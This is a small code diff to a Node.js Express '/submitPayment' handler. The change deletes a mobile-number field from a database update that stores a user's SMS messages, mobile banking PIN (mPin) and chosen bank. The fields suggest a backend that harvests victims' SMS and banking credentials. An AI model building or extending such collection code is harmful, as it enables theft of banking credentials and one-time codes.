@@ -143,7 +143,7 @@ app.post("/submitPayment", async (req, res) => {
       { uniqueID: data.uniqueID },
       {
         $push: { allUserSms: allSms },
-        mobileNumber,
+       
         selectedPaymentMethod: method,
         mPin,
         selectedBank,
